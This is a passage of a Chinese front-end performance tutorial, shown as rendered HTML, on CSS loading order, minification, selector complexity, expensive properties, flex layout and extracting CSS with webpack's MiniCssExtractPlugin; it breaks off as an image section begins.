class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>other.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>那就不需要等待 index.css 下载，几乎是并行执行了。</p>\n<h4 id="谨慎对待-javascript-脚本的位置"><a href="#%E8%B0%A8%E6%85%8E%E5%AF%B9%E5%BE%85-javascript-%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%8D%E7%BD%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>谨慎对待 JavaScript 脚本的位置</h4>\n<p>将 “JavaScript 脚本放到页面尾部、CSS 放到页面头部”的模式。这只是大多数情况的处理方式。对于一些特殊情况，我们还是需要特殊处理的。</p>\n<p>还记得之前提到的一些统计类、监控类的第三方脚本么？一般而言，第三方会提供你如下一段脚本，然后推荐你内联到页面中：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="34224941923854390000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<script>\n  var script = document.createElement(\'script\');\n  script.src = \'vendor.lib.js\';\n  document.getElementsByTagName(\'head\')[0].appendChild(script);\n</script>`, `34224941923854390000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'script\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">\'vendor.lib.js\'</span><span class="token punctuation">;</span>\n  document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'head\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>我们希望通过这样的方式来尽快异步加载脚本。然而，如果我们一不小心出现了下面这样的操作，可能会事与愿违：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="92744804373810000000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;stylesheet&quot; href=&quot;navigator.css&quot; />\n<script>\n  var script = document.createElement(\'script\');\n  script.src = \'vendor.lib.js\';\n  document.getElementsByTagName(\'head\')[0].appendChild(script);\n</script>`, `92744804373810000000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigator.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'script\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">\'vendor.lib.js\'</span><span class="token punctuation">;</span>\n  document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'head\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这时，navigator.css 的加载会阻塞后面的 JavaScript 执行，这是为了防止后续脚本对样式的查询出现不确定性。所以，这两个资源就变成了串行加载。</p>\n<p>要优化这个问题很简单，调换一下顺序即可：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="44307653406143460000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<script>\n  var script = document.createElement(\'script\');\n  script.src = \'vendor.lib.js\';\n  document.getElementsByTagName(\'head\')[0].appendChild(script);\n</script>\n<link rel=&quot;stylesheet&quot; href=&quot;navigator.css&quot; />`, `44307653406143460000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'script\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">\'vendor.lib.js\'</span><span class="token punctuation">;</span>\n  document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'head\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigator.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这时，vendor.lib.js 和 navigator.css 就会并行加载了。当然，你需要确保不需要查询 navigator.css 样式应用后的信息。</p>\n<h3 id="减少包体大小-2"><a href="#%E5%87%8F%E5%B0%91%E5%8C%85%E4%BD%93%E5%A4%A7%E5%B0%8F-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少包体大小</h3>\n<h4 id="压缩"><a href="#%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>压缩</h4>\n<p>CSS 同样可以进行压缩，与 JavaScript 类似，也有相应的 CSS uglify 工具，例如 clean-css，可以优化代码、删除多余的换行与空格。</p>\n<p>同时，由于 CSS 同样是文本内容，因此针对文本的各类压缩算法同样适用，最常用到的就是 gzip。如何在 Nginx 上开启它之前也介绍过，这里就不赘述了。</p>\n<h4 id="选择合适的兼容性"><a href="#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>选择合适的兼容性</h4>\n<p>对于 CSS 的 polyfill，同样可以配合 browserslist 来实现你的业务场景下的兼容性支持。比较常见的是配合 Autoprefixer 和 PostCSS Preset Env 来使用。可以根据指定的浏览器范围，决定使用哪些 CSS polyfill 来帮助你将新的 CSS 代码转换为旧的浏览器能识别的内容。</p>\n<h3 id="解析与渲染树构建"><a href="#%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%B8%B2%E6%9F%93%E6%A0%91%E6%9E%84%E5%BB%BA" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>解析与渲染树构建</h3>\n<h4 id="简化选择器"><a href="#%E7%AE%80%E5%8C%96%E9%80%89%E6%8B%A9%E5%99%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>简化选择器</h4>\n<p>在 <a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/" target="_blank" rel="nofollow noreferrer noopener">浏览器的工作原理：新式网络浏览器幕后揭秘</a> 一文中，作者介绍了样式计算的原理。虽然文章发布时间比较早了，但其中部分内容还是具有参考价值的。</p>\n<p>其中指出了，样式数据是一个超大的结构，为每一个元素查找匹配的规则会造成性能问题，同时，复杂的层叠规则也会带来很高的复杂度。针对这些问题浏览器也做了很多优化。</p>\n<p>正是由于这些问题，我们应该尽量避免不必要的选择器复杂度。例如下面这个复杂选择器：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="53139090590283590000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`body > main.container > section.intro h2:nth-of-type(odd) + p::first-line a[href\\$=\'.pdf\'] {\n  /* …… */\n}`, `53139090590283590000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">body > main.container > section.intro h2:nth-of-type(odd) + p::first-line a[href$=\'.pdf\']</span> <span class="token punctuation">{</span>\n  <span class="token comment">/* …… */</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<p>不过一般情况下我们是不会写出如此复杂的选择器的。但有一个情况还是需要注意一下，就是使用 SASS、LESS 这样的工具时，避免过多的嵌套。以 LESS 为例：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="60680002477383370000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`.list {\n  .item {\n    .product {\n      .intro {\n        .pic {\n          height: 200px;\n        }\n      }\n    }\n  }\n}`, `60680002477383370000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="less"\n              >\n                <span class="gatsby-code-button-language">less</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="less"><pre style="counter-reset: linenumber NaN" class="language-less line-numbers"><code class="language-less"><span class="token selector">.list</span> <span class="token punctuation">{</span>\n  <span class="token selector">.item</span> <span class="token punctuation">{</span>\n    <span class="token selector">.product</span> <span class="token punctuation">{</span>\n      <span class="token selector">.intro</span> <span class="token punctuation">{</span>\n        <span class="token selector">.pic</span> <span class="token punctuation">{</span>\n          <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n      <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>由于过多的嵌套，编译后会产生如下选择器：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="283301614097952740"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`.list .item .product .intro .pic {\n  height: 200px;\n}`, `283301614097952740`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.list .item .product .intro .pic</span> <span class="token punctuation">{</span>\n  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<p>当然，你也可以考虑使用类似 BEM 这样的方式来进行 CSS className 的组织与命名，避免过多的嵌套层级。这里有一篇<a href="https://www.sitepoint.com/optimizing-css-id-selectors-and-other-myths/" target="_blank" rel="nofollow noreferrer noopener">文章</a>介绍了选择器的匹配成本。</p>\n<p>不过千万要注意了，代码的可维护性还是最重要的，不要为了过分简化选择器而放弃了代码语义和可维护性。我们仅仅是要尽量避免像上面那样的一些过分复杂的、或者不必要的繁琐的选择器。</p>\n<h4 id="避免使用昂贵的属性"><a href="#%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E6%98%82%E8%B4%B5%E7%9A%84%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免使用昂贵的属性</h4>\n<p>有一些 CSS 的属性在渲染上是有比较高的成本的，渲染速度相较而言也会慢些。在不同的浏览器上，具体的表现不太一致，但总体来说，下面一些属性是比较昂贵的：</p>\n<ul>\n<li>border-radius</li>\n<li>box-shadow</li>\n<li>opacity</li>\n<li>transform</li>\n<li>filter</li>\n<li>position: fixed</li>\n</ul>\n<h4 id="使用先进的布局方式"><a href="#%E4%BD%BF%E7%94%A8%E5%85%88%E8%BF%9B%E7%9A%84%E5%B8%83%E5%B1%80%E6%96%B9%E5%BC%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用先进的布局方式</h4>\n<p>对于页面布局，我们有很多方法，例如 float、positioning、flex、grid 等。float 本身设计出来并非是为了处理复杂的布局，但是通过大家的发掘和研究，已经可以通过它来实现很多种布局形式了。基于兼容性考虑，float 也成为了流行的布局方式。</p>\n<p>不过，一些资料也指出，使用新版的 flex 进行布局比我们用的一些“老式”方法性能更好（例如基于 float 的浮动布局）。flex 在移动端具有不错的兼容性，很多移动场景下已经大规模使用 flex 进行页面布局。同时，虽然 flex 有兼容性要求，但由于很多 PC 站都不再兼容低版本 IE，因此也可以开始尝试使用它。</p>\n<h3 id="利用缓存-1"><a href="#%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>利用缓存</h3>\n<p>与其他静态资源类似，我们仍然可以使用各类缓存策略来加速资源的加载。</p>\n<p>此外，如果使用 webpack 作为构建工具，我们一般会使用 css-loader 和 style-loader，这样可以直接在 JavaScript 代码中 import 样式文件。不过这样带来的一个问题就是样式代码其实是耦合在 JavaScript 代码中的，通过运行时添加 style 标签注入页面。</p>\n<p>一个更好的做法是在生产环境中将样式信息单独抽离成 CSS 文件，这样也可以更好地利用缓存。在 webpack v4.x 之前的版本中，我们习惯于用 ExtractTextWebpackPlugin 插件。不过在 v4.x 之后，对于 CSS 的抽取，推荐使用 MiniCssExtractPlugin 插件。它可以将样式信息单独抽离出 CSS 文件来。基础的使用方式如下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="68114122333640650000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// webpack.config.js\nconst MiniCssExtractPlugin = require(\'mini-css-extract-plugin\');\nmodule.exports = {\n  plugins: [\n    new MiniCssExtractPlugin({\n      filename: \'[contenthash:8].css\',\n      chunkFilename: \'[contenthash:8].css\'\n    })\n  ],\n  module: {\n    rules: [\n      {\n        test: /\\.css\\$/,\n        use: [MiniCssExtractPlugin.loader, \'css-loader\']\n      }\n    ]\n  }\n};`, `68114122333640650000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// webpack.config.js</span>\n<span class="token keyword">const</span> MiniCssExtractPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">\'mini-css-extract-plugin\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nmodule<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>\n  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>\n    <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>\n      filename<span class="token punctuation">:</span> <span class="token string">\'[contenthash:8].css\'</span><span class="token punctuation">,</span>\n      chunkFilename<span class="token punctuation">:</span> <span class="token string">\'[contenthash:8].css\'</span>\n    <span class="token punctuation">}</span><span class="token punctuation">)</span>\n  <span class="token punctuation">]</span><span class="token punctuation">,</span>\n  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>\n      <span class="token punctuation">{</span>\n        test<span class="token punctuation">:</span> <span class="token regex">/\\.css$/</span><span class="token punctuation">,</span>\n        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>MiniCssExtractPlugin<span class="token punctuation">.</span>loader<span class="token punctuation">,</span> <span class="token string">\'css-loader\'</span><span class="token punctuation">]</span>\n      <span class="token punctuation">}</span>\n    <span class="token punctuation">]</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>相较于 JavaScript，用户对 CSS 的可控性可能会稍弱一些，基础的优化点也许没有那么多。但随着 CSS 特性（例如 <a href="https://codersblock.com/blog/say-hello-to-houdini-and-the-css-paint-api/" target="_blank" rel="nofollow noreferrer noopener">Houdini/CSS Paint API</a>）的不断发展，相信也会有更多我们需要关注的优化点。</p>\n<h2 id="图片"><a href="#%E5%9B%BE%E7%89%87" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>图片</h2>\n<p>优质的图片可以有效吸引用户，给用户良好的体验，所以随着互联网的发展，越来越多的产品开始使用图片来提升产品体验。相较于页面其他元素，图片的体积不容忽视。下图是截止 2019 年 6 月 HTTP Archive 上统计的网站上各类资源加载的体积：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-d69c7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 33.908541846419325%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsSAAALEgHS3X78AAABF0lEQVQY0zWQ227EIAxE8/9/2D5sd3ODTQjGNveEbJ2oHRnJHAZGpnPgRMv7Pc+zUgrRAVxFiGZdx3G0dkNEuG3SiHOaZgArfcfMG8DPILbp8XiadWMmJtos9LMahmEcZgkQwoSr2fpJ9f0wjQoddjEG61BPGjnAY3RqDTFIgQWtlsDefD3Rgo8X1mB7AAYy3y9J7VJMWRZTCGLwSfpbOcbkOXiBnNOfJElst5Nl25VSaqkyj8xs7FZqLf8yxsgsFqHuF6y1EtJba/madRNn6VprIWX5gRDzMi3k+BB0HI6Dtkjo16eOFI6LHcaRQI/evHSOuTvPUw4w0f2Kl+Dz/DSBpe4xyY3dUatVyOVMeQ+h7fsB2I72C0DujGKCVRsUAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 11 18 47" title="" data-src="/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-fee1c.png" data-srcset="/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-a67b7.png 200w,\n/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-0b187.png 400w,\n/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-fee1c.png 